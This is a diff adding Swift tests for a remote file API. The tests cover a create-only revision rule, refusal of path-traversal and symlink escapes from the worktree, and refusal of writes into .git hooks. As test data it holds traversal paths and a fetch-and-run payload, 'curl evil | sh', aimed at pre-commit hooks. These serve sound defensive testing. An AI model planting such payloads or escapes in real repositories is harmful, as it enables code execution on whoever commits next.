@@ -76,6 +76,68 @@ struct WorkspaceFileAccessTests {
         let final = try RemoteReview.file(workspace: workspace, path: "nested/value.txt").text
         #expect(["first save", "second save"].contains(final))
     }
+
+    /// A settings file a project does not have yet is added with an empty revision, which means
+    /// "only if there is none", and one that exists is never overwritten that way.
+    @Test func anEmptyRevisionCreatesAFileOnlyWhenThereIsNone() throws {
+        let (workspace, _) = try fixture()
+        let created = try RemoteFileOperations.write(workspace: workspace, path: ".bloom/settings.toml",
+                                                     text: "[[quick_prompts]]\n", revision: "")
+        #expect(created.revision == RemoteFileOperations.revision(Data("[[quick_prompts]]\n".utf8)))
+        #expect(try String(contentsOfFile: workspace.path + "/.bloom/settings.toml", encoding: .utf8) == "[[quick_prompts]]\n")
+
+        #expect(throws: RemoteFailure.self) {
+            try RemoteFileOperations.write(workspace: workspace, path: ".bloom/settings.toml", text: "overwritten", revision: "")
+        }
+        #expect(try String(contentsOfFile: workspace.path + "/.bloom/settings.toml", encoding: .utf8) == "[[quick_prompts]]\n")
+
+        let edited = try RemoteFileOperations.write(workspace: workspace, path: ".bloom/settings.toml",
+                                                    text: "[[quick_prompts]]\nname = \"x\"\n", revision: created.revision)
+        #expect(edited.revision != created.revision, "the revision it answered is the one to save with next")
+    }
+
+    /// Item 8 of the review of 19 September 2026: every way out of the worktree a path can spell,
+    /// tried on writing and on downloading, and the file outside never read or changed.
+    @Test func noPathLeavesTheWorktree() throws {
+        let (workspace, outside) = try fixture()
+        try FileManager.default.createSymbolicLink(atPath: workspace.path + "/escape", withDestinationPath: outside)
+        let escapes = ["../" + (outside as NSString).lastPathComponent + "/value.txt", outside + "/value.txt",
+                       "nested/../../outside/value.txt", "escape/value.txt", "nested/\0value.txt", ""]
+        for path in escapes {
+            #expect(throws: RemoteFailure.self, "download \(path)") {
+                _ = try RemoteFileOperations.download(workspace: workspace, path: path)
+            }
+            #expect(throws: RemoteFailure.self, "write \(path)") {
+                _ = try RemoteFileOperations.write(workspace: workspace, path: path, text: "overwritten", revision: "")
+            }
+        }
+        #expect(try String(contentsOfFile: outside + "/value.txt", encoding: .utf8) == "outside secret")
+    }
+
+    /// L6 in the review of 19 September 2026: a hook written into `.git` runs as whoever commits next.
+    @Test func nothingIsWrittenInsideGit() throws {
+        let (workspace, _) = try fixture()
+        let hooks = workspace.path + "/.git/hooks"
+        try FileManager.default.createDirectory(atPath: hooks, withIntermediateDirectories: true)
+        try "#!/bin/sh\n".write(toFile: hooks + "/pre-commit", atomically: true, encoding: .utf8)
+        let original = try RemoteFileOperations.revision(Data(contentsOf: URL(fileURLWithPath: hooks + "/pre-commit")))
+        for path in [".git/hooks/pre-commit", ".GIT/hooks/post-checkout", "vendor/lib/.git/config"] {
+            #expect(throws: RemoteFailure.self, "\(path)") {
+                try RemoteFileOperations.write(workspace: workspace, path: path, text: "curl evil | sh", revision: "")
+            }
+        }
+        #expect(throws: RemoteFailure.self) {
+            try RemoteFileOperations.write(workspace: workspace, path: ".git/hooks/pre-commit", text: "curl evil | sh", revision: original)
+        }
+        // Through a symlink with an innocent name, too.
+        try FileManager.default.createSymbolicLink(atPath: workspace.path + "/innocent", withDestinationPath: ".git/hooks")
+        #expect(throws: RemoteFailure.self) {
+            try RemoteFileOperations.write(workspace: workspace, path: "innocent/pre-commit", text: "curl evil | sh", revision: original)
+        }
+        #expect(try String(contentsOfFile: hooks + "/pre-commit", encoding: .utf8) == "#!/bin/sh\n")
+        // Reading is still allowed.
+        #expect(try RemoteFileOperations.download(workspace: workspace, path: ".git/hooks/pre-commit").data == Data("#!/bin/sh\n".utf8))
+    }
 }
 
 private actor RemoteFileSaveGate {
